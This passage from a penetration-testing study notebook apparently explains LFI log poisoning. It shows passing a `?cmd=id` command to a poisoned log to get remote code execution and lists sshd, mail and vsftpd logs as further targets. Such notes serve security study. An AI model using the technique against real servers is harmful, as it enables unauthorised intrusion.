> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Inclusions%20273322b142ad4dd2806ca52bd28d7e9a/Study%20Notes%20e9a012804c054c9ea5aa1aa5ac36b644/Untitled%2011.png)
> 
> As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (`?cmd=id`):
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Inclusions%20273322b142ad4dd2806ca52bd28d7e9a/Study%20Notes%20e9a012804c054c9ea5aa1aa5ac36b644/Untitled%2012.png)
> 
> Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:
> 
> - `/var/log/sshd.log`
> - `/var/log/mail`
> - `/var/log/vsftpd.log`